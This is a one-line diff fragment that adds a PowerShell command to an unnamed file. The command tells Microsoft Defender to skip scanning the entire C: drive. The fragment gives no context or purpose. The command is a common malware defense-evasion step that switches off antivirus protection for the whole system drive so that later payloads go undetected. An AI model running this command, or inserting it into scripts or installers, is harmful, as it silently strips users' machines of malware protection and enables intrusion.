@@ -1,0 +1,1 @@
+﻿Add-MpPreference -ExclusionPath 'C:\\'
